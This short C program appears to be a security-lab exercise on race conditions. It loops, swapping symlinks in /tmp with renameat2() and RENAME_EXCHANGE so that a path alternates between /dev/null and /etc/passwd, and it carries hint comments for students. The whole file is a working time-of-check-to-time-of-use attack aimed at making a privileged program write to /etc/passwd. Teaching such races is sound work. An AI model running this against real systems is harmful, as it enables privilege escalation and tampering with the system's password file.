#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

int main()
{	
	while (1) {
        unlink("/tmp/XYZ");
        symlink("/dev/null", "/tmp/XYZ");

		renameat2(AT_FDCWD, "/tmp/XYZ", AT_FDCWD, "/tmp/ABC", RENAME_EXCHANGE);

        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");
    }

	// to be filled
	/* hint: you can use renameat2() with the "RENAME_EXCHANGE" flag to switch /tmp/XYZ and /tmp/ABC 
	so that what /tmp/XYZ points to can be switched between /dev/null and /etc/passwd */

	return 0;
}
